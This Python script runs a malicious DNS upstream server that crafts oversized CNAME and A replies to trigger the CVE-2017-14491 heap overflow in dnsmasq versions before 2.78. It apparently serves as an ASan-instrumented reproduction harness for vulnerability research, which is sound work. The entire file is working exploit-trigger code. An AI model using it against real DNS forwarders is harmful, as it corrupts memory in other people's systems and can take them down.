#!/usr/bin/env python3
"""
Malicious DNS upstream for CVE-2017-14491 (dnsmasq < 2.78 heap overflow).

dnsmasq runs as a forwarder pointing here (127.0.0.1#5399) with the minimum
edns-packet-max (512), so the build-time ASan fence (asan_fence_14491.py)
poisons the answer-buffer slack above the reply `limit` (= header+udp_size,
offset 512). We answer the forwarded A query with a CNAME -> A pair whose names
are long but valid (cacheable). The A record's owner is the long CNAME target,
written in FULL (no compression vs. the question name), so the cache-served
reply is > 512 bytes.

On the FIRST query dnsmasq forwards and caches the pair. On the SECOND query it
serves the pair from cache and rebuilds the reply via
add_resource_record(..., "d"/owner, long_name): the pre-fix do_rfc1035_name()
(util.c) writes the whole name and only checks `limit` AFTERWARDS, so the write
walks past `limit` into the poisoned slack ->

  AddressSanitizer: use-after-poison ... in do_rfc1035_name (util.c:244)
    #1 add_resource_record (rfc1035.c:1140)   <- case 'd', the exact line the
    #2 answer_request      (rfc1035.c:1655)       2.78 fix guards with CHECK_LIMIT

i.e. the genuine CVE-2017-14491 over-write, made observable with the modbus-
CVE-2019-14462-style moving fence (the overshoot is contained within the
MAXDNAME+RRFIXEDSZ slack of the same safe_malloc() allocation, so ASan is
silent without the fence).

Reference: dnsmasq fix commit 0549c73b ("Security fix, CVE-2017-14491").
"""

import socket
import struct

PORT = 5399
LABELS = 8       # number of labels in the long target name
LABEL_LEN = 60   # bytes per label (-> ~488-byte presentation name, < MAXDNAME)


def dw(x):
    return struct.pack(">H", x)


def dd(x):
    return struct.pack(">I", x)


def encode_name(labels):
    return b"".join(bytes([len(l)]) + l for l in labels) + b"\x00"


def long_name(seed):
    return [(("%s%d" % (seed, i)).encode() + b"a" * LABEL_LEN)[:LABEL_LEN]
            for i in range(LABELS)]


def make_response(query):
    txid = query[:2]

    # Echo the client's question verbatim.
    qend = 12
    while query[qend] != 0:
        qend += 1 + query[qend]
    qend += 1
    question = query[12:qend + 4]

    target = encode_name(long_name("al"))

    # CNAME: owner = question name (0xc00c pointer), rdata = long target name.
    cname = b"\xc0\x0c" + dw(0x0005) + dw(0x0001) + dd(60) + dw(len(target)) + target
    # A: owner = the long target name written in FULL, rdata = 10.0.0.1.
    a = target + dw(0x0001) + dw(0x0001) + dd(60) + dw(4) + bytes([10, 0, 0, 1])

    answers = cname + a
    header = txid + dw(0x85A0) + dw(1) + dw(2) + dw(0) + dw(0)
    return header + question + answers


def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("127.0.0.1", PORT))
    print(f"[upstream] CVE-2017-14491 malicious DNS upstream on 127.0.0.1:{PORT}", flush=True)
    while True:
        data, addr = sock.recvfrom(2048)
        print(f"[upstream] forwarded query from {addr}", flush=True)
        resp = make_response(data)
        print(f"[upstream] sending {len(resp)}-byte CNAME+A response", flush=True)
        sock.sendto(resp, addr)


if __name__ == "__main__":
    main()
